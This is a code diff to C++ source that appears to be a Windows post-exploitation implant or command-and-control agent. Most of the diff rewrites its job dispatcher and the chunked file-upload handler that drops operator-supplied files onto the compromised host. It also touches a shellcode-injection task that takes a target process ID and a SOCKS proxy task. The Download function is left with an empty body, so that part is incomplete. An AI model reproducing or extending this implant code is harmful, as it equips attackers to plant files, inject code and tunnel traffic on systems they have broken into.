@@ -18,7 +18,8 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
     BYTE     JobID    = 0;
     ULONG    TaskQtt  = 0;
 
-    Package = Self->Pkg->NewTask();
+    PostJobs = Self->Pkg->PostJobs();
+    Package  = Self->Pkg->NewTask();
     if ( ! Package ) {
         KhDbg("ERROR: Failed to create new task package");
         goto CLEANUP;
@@ -51,7 +52,6 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
         KhDbg("Task quantity received: %d", TaskQtt);
 
         if ( TaskQtt > 0 ) {
-            PostJobs = Self->Pkg->PostJobs();
             if ( !PostJobs ) {
                 KhDbg("ERROR: Failed to create post jobs package");
                 goto CLEANUP;
@@ -78,10 +78,11 @@ auto DECLFN Task::Dispatcher(VOID) -> VOID {
                     continue;
                 }
             }
-
-            Self->Jbs->ExecuteAll();
-            Self->Jbs->Send( PostJobs );
         }
+    }
+
+    if ( Self->Jbs->ExecuteAll() ) {
+        Self->Jbs->Send( PostJobs );
     }
 
 CLEANUP:
@@ -142,96 +143,171 @@ auto DECLFN Task::ExecBof(
 auto DECLFN Task::Download(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
+
 }
 
-auto DECLFN Task::Upload(
-    _In_ JOBS* Job
-) -> ERROR_CODE {
-    PACKAGE* Package  = Job->Pkg;
-    PARSER*  Parser   = Job->Psr;
-    BOOL     Success  = FALSE;    
-
-    ULONG  UUIDLen = 0;
-    PVOID  Data    = { 0 };
-    SIZE_T Length  = 0;
-
-    HANDLE FileHandle = INVALID_HANDLE_VALUE;
-
-    BYTE* FileBuffer = B_PTR( hAlloc( KH_CHUNK_SIZE ) );
-    ULONG FileLength = 0;
-    BYTE* TmpBuffer  = { 0 };
-    ULONG TmpLength  = 0;
-    ULONG AvalBytes  = 0;
-
-    CHAR* FileID    = nullptr;
-    CHAR* FilePath  = nullptr;
-    ULONG CurChunk  = 1;
+auto DECLFN Task::Upload(_In_ JOBS* Job) -> ERROR_CODE {
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
+    
+    CHAR* FileID   = nullptr;
+    CHAR* FilePath = nullptr;
+    INT8  Index    = -1;
 
     ULONG UploadState = Self->Psr->Int32( Parser );
 
+    KhDbg("Upload state: %d", UploadState);
+
     switch ( UploadState ) {
         case Enm::Up::Init: {
-            for ( INT i = 0; i < 5; i++ ) {
-                FileID = Self->Tsp->Up[i].FileID;
-                
-                if ( FileID || Str::LengthA( FileID ) ) {
-                    continue;
+            FileID = Self->Psr->Str( Parser, 0 );
+            KhDbg("file id: %s", FileID);
+            for (INT i = 0; i < 10; i++) {
+                if ( ! Self->Tsp->Up[i].FileID || ! Str::LengthA( Self->Tsp->Up[i].FileID ) ) {
+                    Index = i; break;
                 }
             }
-            if ( FileID ) {
-                CHAR* ErrorMsg = "The maximum number of files you can upload at the same time is 5";
-                KhDbg( "%s", ErrorMsg );
-                Self->Pkg->SendMsg( Job->UUID, ErrorMsg, CALLBACK_ERROR );
+
+            KhDbg("index: %d", Index);
+
+            if (Index == -1) {
+                CHAR* ErrorMsg = "Maximum concurrent uploads (10) reached";
+                KhDbg("%s", ErrorMsg);
+                Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
                 return KhRetSuccess;
             }
 
-            FileID   = Self->Psr->Str( Parser, 0 );
-            FilePath = Self->Psr->Str( Parser, 0 );
+            FilePath = Self->Psr->Str(Parser, 0);
 
-            if ( ! FilePath ) {
-                FilePath = ".";
-            }
+            KhDbg("file path: %s", FilePath);
 
-            KhDbg( "uploading file at path %s with id: %s", FilePath, FileID );
+            Self->Tsp->Up[Index].FileID = FileID;
+            Self->Tsp->Up[Index].Path   = FilePath;
+            Self->Tsp->Up[Index].CurChunk = 0;
+            Self->Tsp->Up[Index].BytesReceived = 0;
+            Self->Tsp->Up[Index].TotalChunks = 0; 
 
-            Self->Pkg->Int32( Package, CurChunk );
+            Self->Pkg->Int32( Package, 1 ); // Start with chunk 1
             Self->Pkg->Str( Package, FileID );
             Self->Pkg->Str( Package, FilePath );
             Self->Pkg->Int32( Package, KH_CHUNK_SIZE );
 
-            KhDbg( "sending..." )
-            KhDbg( "current chunk: %d", CurChunk );
-            KhDbg( "file id      : %s", FileID );
-            KhDbg( "path         : %s", FilePath );
-            KhDbg( "chunk size   : %d", KH_CHUNK_SIZE );
+            KhDbg("Init upload: ID=%s, Path=%s", FileID, FilePath);
 
-            Self->Pkg->Transmit( Package, &Data, &Length );
-                break;
+            break;
         }
         case Enm::Up::Chunk: {
-            INT8 Index = -1;
-
-            FileID = Self->Psr->Str( Parser, 0 );
-            
-            for ( INT i = 0; i < 5; i++ ) {
-                if ( Str::CompareA( FileID, Self->Tsp->Up[i].FileID ) == 0 ) {
-                    Index = i; break;
-                }
-            }
-            if ( Index == -1 ) {
-                CHAR* ErrorMsg = "File ID not found";
-                KhDbg( "%s", ErrorMsg );
-                Self->Pkg->SendMsg( Job->UUID, ErrorMsg, CALLBACK_ERROR );
+            FileID = Self->Psr->Str(Parser, 0);
+            if (!FileID) {
+                CHAR* ErrorMsg = "Invalid File ID";
+                KhDbg("%s", ErrorMsg);
+                Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
                 return KhRetSuccess;
             }
+
+            INT TotalChunks = Self->Psr->Int32(Parser);
+            INT ChunkNumber = Self->Psr->Int32(Parser);
+            INT ChunkSize = Self->Psr->Int32(Parser);
+            BYTE* ChunkData = Self->Psr->Bytes(Parser, 0);
+
+            KhDbg("total: %d", TotalChunks);
+            KhDbg("chunk number: %d", ChunkNumber);
+            KhDbg("chunk size: %d", ChunkSize);
+            KhDbg("chunk data: %p", ChunkData); 
+
+            INT FileIndex = -1;
+            for (INT i = 0; i < 10; i++) {
+                if (Self->Tsp->Up[i].FileID && Str::CompareA(FileID, Self->Tsp->Up[i].FileID) == 0) {
+                    FileIndex = i;
+                    break;
+                }
+            }
+
+            if (FileIndex == -1) {
+                CHAR* ErrorMsg = "File ID not found";
+                KhDbg("%s", ErrorMsg);
+                Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
+                return KhRetSuccess;
+            }
+
+            if (
+                ! Self->Tsp->Up[FileIndex].FileHandle || 
+                Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE
+            ) {
+                Self->Tsp->Up[FileIndex].FileHandle = Self->Krnl32.CreateFileA(
+                    Self->Tsp->Up[FileIndex].Path, FILE_APPEND_DATA,
+                    FILE_SHARE_READ, nullptr, OPEN_ALWAYS,
+                    FILE_ATTRIBUTE_NORMAL, nullptr
+                );
+
+                if (Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE) {
+                    CHAR* ErrorMsg = "Failed to create/open file";
+                    KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
+                    Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
+                    return KhRetSuccess;
+                }
+            }
+
+            Self->Krnl32.SetFilePointer(
+                Self->Tsp->Up[FileIndex].FileHandle,
+                0, nullptr, FILE_END
+            );
+
+            DWORD bytesWritten;
+            BOOL writeResult = Self->Krnl32.WriteFile(
+                Self->Tsp->Up[FileIndex].FileHandle,
+                ChunkData, ChunkSize, &bytesWritten, nullptr
+            );
+
+            if (!writeResult || bytesWritten != ChunkSize) {
+                CHAR* ErrorMsg = "Failed to write chunk to file";
+                KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
+                Self->Pkg->SendMsg(Job->UUID, ErrorMsg, CALLBACK_ERROR);
+                
+                if (Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE) {
+                    Self->Ntdll.NtClose(Self->Tsp->Up[FileIndex].FileHandle);
+                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
+                }
+                
+                return KhRetSuccess;
+            }
+
+            Self->Tsp->Up[FileIndex].CurChunk = ChunkNumber;
+            Self->Tsp->Up[FileIndex].BytesReceived += bytesWritten;
+            Self->Tsp->Up[FileIndex].TotalChunks = TotalChunks;
+
+            KhDbg("Chunk %d/%d (%d bytes) written to %s", 
+                ChunkNumber, TotalChunks, bytesWritten, FileID);
+
+            if ( ChunkNumber == TotalChunks || ChunkSize < KH_CHUNK_SIZE ) {
+                KhDbg("Upload completed: %s (%d bytes total)", 
+                    FileID, Self->Tsp->Up[FileIndex].BytesReceived);
+
+                if (Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE) {
+                    Self->Ntdll.NtClose(Self->Tsp->Up[FileIndex].FileHandle);
+                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
+                }
+
+                if (Self->Tsp->Up[FileIndex].FileID) {
+                    hFree(Self->Tsp->Up[FileIndex].FileID);
+                    Self->Tsp->Up[FileIndex].FileID = nullptr;
+                }
+                
+                if (Self->Tsp->Up[FileIndex].Path) {
+                    hFree(Self->Tsp->Up[FileIndex].Path);
+                    Self->Tsp->Up[FileIndex].Path = nullptr;
+                }
+
+                Self->Tsp->Up[FileIndex].CurChunk = 0;
+                Self->Tsp->Up[FileIndex].BytesReceived = 0;
+                Self->Tsp->Up[FileIndex].TotalChunks = 0;
+            }
+
             break;
         }
     }
 
-_KH_END:
-    if ( FileBuffer ) hFree( FileBuffer );
-
-    return KhGetError;
+    return KhRetSuccess;
 }
 
 auto DECLFN Task::ScInject(
@@ -241,15 +317,10 @@ auto DECLFN Task::ScInject(
     PARSER*  Parser  = Job->Psr;
     PACKAGE* Package = Job->Pkg;
 
-    KhDbg("dbg");
     ULONG    Length    = 0;
-    KhDbg("dbg");
     BYTE*    Buffer    = Self->Psr->Bytes( Parser, &Length );
-    KhDbg("dbg");
     ULONG    ProcessId = Self->Psr->Int32( Parser );
-    KhDbg("dbg");
     INJ_OBJ* Object    = (INJ_OBJ*)hAlloc( sizeof( INJ_OBJ ) );
-    KhDbg("dbg");
 
     Object->ProcessId = ProcessId;
 
@@ -857,7 +928,7 @@ auto DECLFN Task::Socks(
                         if ( IoCtlRes == 0 && DataAvail > 0 ) {
                             if ( ( TotalRead + DataAvail ) > BuffRecvL ) {
                                 ULONG NewLen  = BuffRecvL * 2;
-                                BYTE* NewBuff = (BYTE*)Self->Hp->ReAlloc( BuffRecv, NewLen );
+                                BYTE* NewBuff = (BYTE*)hReAlloc( BuffRecv, NewLen );
 
                                 BuffRecv  = NewBuff;
                                 BuffRecvL = NewLen;
